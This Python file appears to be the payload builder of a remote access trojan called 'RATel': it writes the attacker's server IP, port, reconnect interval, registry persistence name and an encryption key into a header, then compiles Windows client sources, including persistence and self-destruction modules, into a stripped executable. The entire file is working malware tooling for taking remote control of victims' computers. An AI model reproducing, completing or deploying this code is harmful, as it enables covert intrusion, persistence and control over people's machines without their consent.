from subprocess import Popen, PIPE
import sys
import os
import binascii
import platform 
import time
import argparse
from colorama import Fore, Style, init
import server.scripts.other as other

class GeneratePayload:
    def __init__(self, ip, auto, port, reco, name, registry, password):
        self.path =  os.getcwd() + "/client/inc/common.h"
        self.list_const_str = ["IP_ADDRESS", "NAME_PROG", "PATH_ADMIN", "PATH_NOT_ADMIN", "NAME_KEY_REGISTER", "SPLIT"]
        self.auto = auto
        self.reco = reco * 1000  # convertit les secondes en millisecondes
        self.port = port
        self.ip = ip 
        self.name = name
        self.registry = registry
        self.key = other.generate_PBKDF2_key(password)
        other.printColor("successfully","\nKEY PBKDF2: {}".format(self.key))
        try:
            self.os  = platform.system()
        except Exception as e:
            other.printColor("error", e)
            exit(0)
        self.main()
    
    def writeFile(self, data):
        try:
            with open(self.path, "w") as file:
                file.write(data)
        except Exception as e:
            other.printColor("error", "[-] an error is triggered when writing to common.h")
            other.printColor("error", str(e))
            exit(0)

    def compilate(self):
        current_path = os.getcwd()
        if self.os == "Linux":
            cmd = "i686-w64-mingw32-g++ main.cpp Exec.cpp other.cpp HandShake.cpp Connexion.cpp Persistence.cpp Destruction.cpp -o {} -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path + "/payload/" + self.name)
        elif self.os == "Windows":
            cmd = "g++ main.cpp Exec.cpp HandShake.cpp Persistence.cpp Connexion.cpp other.cpp Destruction.cpp -o {} -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path + "/payload/" + self.name)
        else:
            other.printColor("error", "[-] RATel is incompatible with: {}".format(self.os))
            other.printColor("error", "[-] please try to restart the RATelgenerator on Windows or Linux.")
            exit(1)
        os.chdir("client/src")
        with Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True) as cmd:
            other.printColor("successfully","[+] compilation in progress...")
            out, err = str(cmd.stdout.read(), "UTF8", errors="ignore"), str(cmd.stderr.read(), "UTF8", errors="ignore")
            if not err:
                pass
            else:
                other.printColor("error","[-] An error is triggered when compiling the RAT.")
                other.printColor("error",err) 
                exit(0)
        other.printColor("successfully","[+] the RAT was successfully compiled.") 
        other.printColor("information", "[?] the location of the RAT: {}\n".format(current_path + "/payload/" + self.name))   
    
    def main(self):
        other.printColor("successfully","\n[+] the current OS of the system: {}".format(self.os))
        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.registry, self.key))
        self.compilate()
        time.sleep(1)
        self.writeFile(str(other.commonHeader())) 

    def parse_args():
        parser = argparse.ArgumentParser()
        parser.add_argument("-a", "--auto", action="store_true", default=False, help="if the parameter is added, the RAT will automatically perform the persistence.")
        parser.add_argument("-p", "--port", dest="PORT", default=4444, help="the port number of the server.")
        parser.add_argument("-i", "--ip", dest="IP", required=True, help="IP address of the server.")
        parser.add_argument("-r", "--reconnect", dest="RECONNECT", default=20, help="the time between each reconnection attempt if the server is offline (in seconds).")
        parser.add_argument("-n", "--name", dest="NAME", default="RATel.exe", help="the name of the executable (of the RAT)")
        parser.add_argument("-rs", "--registry", dest="REGISTRY_STRING", default="win64", help="the name of the value of the subkey of the Windows registry.")
        parser.add_argument("-pa", "--password", dest="PASSWORD", default="CISCOTHEBOSS", help="The password to generate the key to encrypt and decrypt the data. The default password is 'CISCOTHEBOSS'.")
        parser.add_argument("-m", "--move", dest="MOVE", default=False, help="Under development...")
        return parser.parse_args()

    if __name__ == "__main__":
        init()
        args = parse_args()
        GeneratePayload(args.IP, args.auto, args.PORT, args.RECONNECT, args.NAME, args.REGISTRY_STRING, args.PASSWORD)
